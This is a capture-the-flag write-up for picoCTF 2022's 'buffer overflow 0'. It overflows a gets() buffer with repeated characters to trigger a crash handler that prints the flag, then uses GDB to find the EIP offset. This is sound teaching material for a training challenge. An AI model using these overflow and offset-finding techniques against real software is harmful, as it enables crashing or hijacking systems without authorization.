# buffer overflow 0
## Description
- **Tags**:
    - picoCTF 2022
    - Binary Exploitation
    - gets
- **Author**:
    - Alex Fulton
    - Palash Oswal

Smash the stack

Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/521/vuln). You can view source [here](https://artifacts.picoctf.net/c/521/vuln.c). And connect with it using:
```
nc saturn.picoctf.net 65355
```
## Exploration
Seems like a pretty basic buffer overflow challenge where we want to attempt to input more data than a buffer can handle. The code appears to be using the typical `gets()` call with no protection on how much input it will try to read in, even with a limited buffer.

While the challenge provides both the source code and a compiled program, might as well try to compile ourselves as well. To do so we'll need to get a feeling for what protections are enabled on the provided binary:

```
$ checksec vuln
[*] '/home/keithjh/src/CTF/pico/2022/Binary_Exploitation/buffer_overflow_0/vuln'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Here we can see that there's no Stack canary, but NX and PIE is enabled. This feels a bit concerning at first as that will make it difficult to have meaningful code execution after a buffer overflow. Regardless let's compile with similar flags to also generate a 32 bit binary. We should be able to use the provided binary and compiled binary interchangeably going forward.

```
$ gcc -m32 -fno-stack-protector vuln.c -o vuln.elf
$ checksec vuln.elf
[*] '/home/keithjh/src/CTF/pico/2022/Binary_Exploitation/buffer_overflow_0/vuln.elf'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Now that we have some understanding and can compile, let's just try an overflow and see what happens.

```
$ ./vuln.elf <<< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Input: picoCTF{REDACTED}
```

Well, that was interesting. The flag was just printed out without really having to manipulate any of the contents of the payload. Looking at the code it seems there's a SIGSEGV handler that just prints out the flag. Clever way to introduce a buffer overflow attack.

This should also work against the remote endpoint, giving us the flag.
```
$ nc saturn.picoctf.net 65355
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{REDACTED}
```

### Bonus Points
That's all we really needed to get the flag for the challenge, but what else can we gather from this example? With NX and PIE there's likely no other easy interesting things to get to execute, however, let's at least identify where the offerflow occurs and where we could inject to EIP if we wanted to.

Using GEF for GDB we can generate a pattern that allows us to easily find where we start overwriting EIP. If we generate a "long enough" pattern and run the program with it, we can search where we start to write over EIP (the offset). Using this offset we know that many characters are necessary before we begin to write over EIP and influence the program execution.
```
$gdb vuln.elf

gef➤  pattern create 50
[+] Generating a pattern of 50 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

gef➤  r <<< aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

gef➤  pattern search $eip
[+] Searching for '$eip'
[+] Found at offset 28 (little-endian search) likely
[+] Found at offset 25 (big-endian search)
```
